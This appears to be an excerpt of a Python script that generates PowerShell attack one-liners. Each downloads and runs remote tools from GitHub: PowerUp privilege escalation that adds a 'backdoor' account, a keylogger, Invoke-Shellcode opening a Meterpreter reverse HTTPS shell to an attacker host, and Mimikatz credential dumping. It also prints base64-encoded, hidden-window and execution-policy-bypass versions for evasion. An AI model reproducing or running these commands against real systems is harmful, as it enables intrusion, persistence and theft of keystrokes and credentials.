...
[3] Write-UserAddMSI
    ...
    if ans == "1":
        ...
        print run_execute + "https://raw.githubusercontent.com/karlmaborg/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
        ...
        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/karlmaborg/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks")
    ...
    if ans == "2":
        ...
        print "[*]Download from internet and execute:"
        print run_execute + "https://raw.githubusercontent.com/karlmaborg/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName "+ans_service+" -UserName backdoor -Password password123 -Verbose"
        print "\n[*]Run from a local copy of the script:"
        ...
        print "\n[*]Base64 encoded version download and execute:"
        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/karlmaborg/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName  "+ans_service+" -UserName backdoor -Password password123 -Verbose")
        print "powershell.exe -enc " + x
    ...
    if ans == "3":
        ...
        print "[*]Download from internet and execute:"
        print run_execute + "https://raw.githubusercontent.com/karlmaborg/PowerTools/master/PowerUp/PowerUp.ps1');Write-UserAddMSI"
        print "\n[*]Run from a local copy of the script:"
        print 'powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1;Write-UserAddMSI}"'
        print "\n[*]Base64 encoded version download and execute:"
        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/karlmaborg/PowerTools/master/PowerUp/PowerUp.ps1');Write-UserAddMSI")
        print "powershell.exe -enc " + x
...
def key():
    ...
    print "[*]Download from internet and execute:"
    print run_execute + "https://raw.githubusercontent.com/karlmaborg/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log"
    print "\n[*]Run from a local copy of the script:"
    print 'powershell.exe -exec bypass -Command "& {Import-Module .\Get-Keystrokes.ps1; Get-Keystrokes -LogPath C:\Users\Public\key.log}"'
    print "\n[*]Base64 encoded version download and execute:"
    x = powershell_encode(run_execute + "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/karlmaborg/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log")
    print "powershell.exe -enc " + x
...
def metasploit():
    ...
    clear() 
    print "[*]Download from internet and execute:"
    print "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/karlmaborg/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force"
    print "\n[*]Run from a local copy of the script:"
    ...
    print "\n[*]Base64 encoded version download and execute:"
    x = powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/karlmaborg/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force")
...
-----------------------------------------------------
    ...
    if ans == 1:
        ...
        print "[*]Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/karlmaborg/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
        print "\n[*]Base64 encoded version download and execute:\nPowershell.exe -NoP -NonI -Exec Bypass -enc " + powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/karlmaborg/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz")
    elif ans == 99:
        sys.exit(0)
